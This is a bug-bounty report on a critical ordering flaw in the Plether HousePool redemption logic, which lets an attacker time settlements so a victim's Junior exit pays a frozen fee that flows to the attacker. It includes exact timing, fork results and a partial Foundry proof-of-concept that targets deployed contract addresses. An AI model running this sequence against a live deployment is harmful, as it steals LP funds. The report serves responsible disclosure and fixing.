# #99756 [CRITICAL]

Source: https://reports.immunefi.com/plether/99756-sc-critical-a-zero-value-senior-head-defers-a-junior-exit-while-admitting-a-new-junior-lp

Description
Summary
Severity: Critical — direct theft of user funds under the Plether competition scope . After funding a payable Senior redemption head, HousePool._fundRedemptionPhase() leaves a subsequent zero-value Senior head queued. That Senior backlog skips an already mature and fundable Junior redemption, but the same call activates a new attacker-owned Junior deposit. If the next settlement is made after the scheduled oracleFrozen boundary, the victim's exit pays the release's 75 bps Junior frozen fee. In a matched deployed-code fork comparison, the victim receives 749,999.999986 USDG less than in the no-dust live-settlement control, while the new Junior LP receives 375,208.615977 USDG more on its eventual exit.
Finding Description
At frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 , HousePool._fundRedemptionPhase() prices each matured head against its phase snapshot. When the quote is zero after any earlier Senior shares have been funded, the phase.fundedShares != 0 branch breaks before refundRedeemEpochRemainder() . The head remains queued and phase.backlog becomes true. This guard protects a head that is zero at the frozen pre-burn quote but positive under the canonical post-burn price, as the committed regression test demonstrates. Finding 10 uses a one-share head that quotes zero both before and after the preceding burn; it is safe to refund, but the branch does not check its post-burn value.
The Senior-backlog branch then skips Junior redemption funding. Only one Senior epoch was processed, below the 16-epoch work cap, so seniorWorkCapHit is false and the function continues to the Junior deposit phase. It can activate the attacker's mature Junior deposit while the victim's earlier mature exit remains unfunded. Without the zero-value Senior head, the same live call funds the victim before the new LP is activated.
The PoC stages the payable Senior request in one epoch and the one-share Senior request in the next, because requests within an epoch aggregate into one head. On Friday 2026-11-06, the payable Senior head matures at 20:00 UTC; the dust Senior head, victim Junior redemption, and attacker Junior deposit mature at 21:00 UTC. A public settlement at 21:59:59 funds the payable Senior head, leaves the dust queued, skips the victim, and activates the attacker deposit. A second settlement at the 22:00 oracleFrozen boundary refunds the dust and funds the victim. The fee selector now applies 75 bps to the Junior redemption. Because the Pool removes only the net funded amount from Junior principal, the fee value stays with surviving Junior shares, including the attacker shares. The attacker later redeems after the market reopens.
The defective branch is separate from the previously documented queue and fee behavior. Cecuro MED-24 , acknowledged without a code change in PR #123 , concerns 16 refunded zero-payout epochs consuming the work budget. Here one unrefunded head that remains zero after the Senior burn causes the skip while seniorProcessedEpochs == 1 , below the cap, and Junior entry proceeds. MED-24's proposed counter change does not alter the fundedShares != 0 branch. The earlier frozen-fee scan describes settlement-time fee application and retained value for continuing LPs. Finding 10 identifies the distinct upstream defect that delays an otherwise fundable Junior exit in a live call while admitting a new Junior LP ; fixing the still-zero Senior-head classification removes this path without changing the fee policy.
Impact Explanation
The matched deployed-code fork branches claim actual six-decimal USDG into the modeled wallets. The no-dust live branch pays the 100,000,000-USDG Junior victim 99,999,999.998091 USDG . The dust-induced frozen branch pays 99,249,999.998105 USDG , a 749,999.999986-USDG shortfall against that control. The attacker's one-USDG Junior deposit later returns 375,209.615748 USDG instead of 0.999771 USDG , an incremental 375,208.615977 USDG . After its separate one-USDG Senior request is paid, the attacker's total cash exceeds both nominal deposits by 375,208.616697 USDG before transaction costs. The remainder of the fee stays in Junior backing for other surviving shares; the PoC does not claim it into a seed-holder wallet.
The first fork constructs an independent 100-million-USDG Junior holder on the release's two-seed state and tests that holder's full exit. A second fork at block 329173378 retains the deployed Junior liquidity, open positions, and a pre-existing independent Junior LP. When that LP requests a partial exit of 20 million Junior shares and the attacker adds 1 million USDG of Junior capital, the no-dust branch pays the LP 20,199,677.777077 USDG and the dust-delayed frozen branch pays 20,048,180.188277 USDG : a 151,497.588800-USDG cash difference. The LP retains Junior shares in this partial-exit case, whose book value rises by 147,839.908305 USDG , leaving 3,657.680495 USDG of net book-value loss. The attacker receives 1,813.428647 USDG more Junior exit cash than in the no-dust control. Both forks exercise the same zero-head ordering defect in matched counterfactual states.
A third branch makes one additional live settlement immediately after the dust-induced stall. It refunds the dust and restores the victim's cash to the no-dust amount. The attack therefore requires the first call to be the last successful live settlement before the frozen boundary.
Likelihood Explanation
The required state is a payable Senior head followed by a separately queued zero-quote one-share head, an independent mature and fundable Junior exit, a mature attacker Junior entry, sufficient Pool cash and Senior-ratio headroom, and a last successful live settlement immediately before Friday's 22:00 UTC frozen transition. An additional successful live settlement after the dust-induced stall clears the head and funds the victim at the live price, as the rescue control demonstrates. In the first PoC's empty position book, public Pool calls suffice. With open positions, the live call uses the public Router and a current Pyth basket; the supplemental fork exercises that route with a mocked external feed. No privileged keeper or Pool role is required.
Recommendation
When a zero-quote Senior head follows a funded head, reprice it using the canonical post-burn Senior principal and share supply. If it is still zero, refund and advance it in the same call; if it is positive, retain the existing deferral so a newly valuable request is not incorrectly refunded. Regression tests should cover both quote outcomes, Junior exit and entry in the same epoch, and a frozen-state transition.
Proof of Concept
Proof of Concept
The standalone Finding 10 fork PoC pins Arbitrum Sepolia block 323664343 after v2.0.0 activation. It checks deployed Pool, Engine, tranche-vault, and USDG runtime hashes and the release's 40-million-USDG Senior cap, 80% Senior share limit, and 75 bps Junior frozen fee. The Pool, Engine, and vaults remain deployed code. The test uses the release's mintable MockUSDG to fund the modeled LPs and a local ArbSys shim for Arbitrum block-number semantics. It branches from one staged state into dust, no-dust, and extra-live-pass controls, then claims victim and attacker USDG. From packages/perps , run with an archive-capable Arbitrum Sepolia RPC:
FINDING10_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test /perps/finding10_poc.t.sol -vv
The focused fork test passes 1/1 , including on a clean checkout of the frozen commit with only this PoC file added. Selected verified output, in six-decimal USDG atoms :
[PASS] testFinding10_ZeroSeniorDustHeadTransfersVictimFrozenFeeToAttacker()
controlVictimCash 99999999998091
delayedVictimCash 99249999998105
victimCashLoss 749999999986
controlAttackerJuniorCash 999771
delayedAttackerJuniorCash 375209615748
attackerExtraJuniorCash 375208615977
attackerSeniorCash 1000949
attackerNetAfterBothPrincipals 375208616697
rescuedVictimCash 99999999998091
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol" ;
import { CfdEngine } from "@plether/perps/CfdEngine.sol" ;
import { HousePool } from "@plether/perps/HousePool.sol" ;
import { TrancheVault } from "@plether/perps/TrancheVault.sol" ;
import { ICfdEngineTypes } from "@plether/perps/interfaces/ICfdEngineTypes.sol" ;
import { IHousePool } from "@plether/perps/interfaces/IHousePool.sol" ;
import { Test , console2 } from "forge-std/Test.sol" ;
interface IFinding10ForkUSDG is IERC20 {
function mint (
address to,
uint256 amount
) external ;
}
/// @dev Foundry's local fork does not implement ArbSys at address(100). This shim returns the fork's
/// rolled block number; it replaces only the chain precompile, never a scoped Plether contract.
contract Finding10ForkArbSys {
function arbBlockNumber ( ) external view returns ( uint256 ) {
return block . number ;
}
}
/// @notice A zero-value Senior head moves a mature Junior redemption across the frozen fee boundary.
/// @dev Forks the seed-only activated release; no in-scope contract is deployed, replaced, or storage-written.
/// The release settlement token is freely mintable MockUSDG, used only to create LP starting balances.
/// No oracle mock is needed: the deployed Pool permits no-position settlement without a mark.
/// From packages/perps, run:
/// FINDING10_FORK_RPC_URL=<Arbitrum-Sepolia-archive-RPC> FOUNDRY_TEST=test/perps forge test \
/// --match-path test/perps/finding10_poc.t.sol -vv --ignored-error-codes 6335 \
/// -o /tmp/plether-f10-out --cache-path /tmp/plether-f10-cache
contract Finding10StandaloneForkPoc is Test {
uint256 private constant FORK_BLOCK = 323_664_343 ;
uint256 private constant START_TIME = 1_793_620_800 ; // Monday 2026-11-02 12:00 UTC.
uint256 private constant FREEZE_START = 1_794_002_400 ; // Friday 2026-11-06 22:00 UTC, 17:00 New York.
// Requests made inside the final five minutes before an hour roll into the following epoch.
uint256 private constant FIRST_REQUEST_TIME = FREEZE_START - 2 hours - 5 minutes - 1 ;
uint256 private constant SECOND_REQUEST_TIME = FREEZE_START - 1 hours - 5 minutes - 1 ;
uint256 private constant LIVE_REOPEN = 1_794_178_800 ; // Sunday 2026-11-08 23:00 UTC, past FAD lag.
uint256 private constant VICTIM_CAPITAL = 100_000_000e6 ;
uint256 private constant JUNIOR_ATTACK_CAPITAL = 1e6 ;
uint256 private constant SENIOR_ATTACK_CAPITAL = 1e6 ;
address private constant VICTIM = address ( 0xB771C );
address private constant ATTACKER = address ( 0xA771C );
address private constant SENIOR_ATTACKER = address ( 0x5E710 );
address private constant SENIOR_DUST = address ( 0xD057 );
address private constant KEEPER = address ( 0xB0B0 );
address private constant USDG_ADDRESS = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D ;
address private constant ENGINE_ADDRESS = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA ;
address private constant POOL_ADDRESS = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e ;
address private constant SENIOR_ADDRESS = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d ;
address private constant JUNIOR_ADDRESS = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e ;
IFinding10ForkUSDG private usdg = IFinding10ForkUSDG(USDG_ADDRESS);
CfdEngine private engine = CfdEngine(ENGINE_ADDRESS);
HousePool private pool = HousePool(POOL_ADDRESS);
TrancheVault private seniorVault = TrancheVault(SENIOR_ADDRESS);
TrancheVault private juniorVault = TrancheVault(JUNIOR_ADDRESS);
struct Stage {
uint256 seniorHead;
uint256 victimHead;
uint256 attackerDepositHead;
uint256 victimShares;
}
struct Outcome {
uint256 victimCash;
uint256 attackerJuniorCash;
uint256 attackerSeniorCash;
uint256 liveVictimQuote;
}
function setUp ( ) public {
string memory rpc = vm.envOr( "FINDING10_FORK_RPC_URL" , string ( "" ));
require ( bytes (rpc). length ! = 0 , "FINDING10_FORK_RPC_URL archive RPC required" );
vm.createSelectFork(rpc, FORK_BLOCK);
assertEq( block . chainid , 421_614 , "Arbitrum Sepolia fork" );
vm.etch( addr
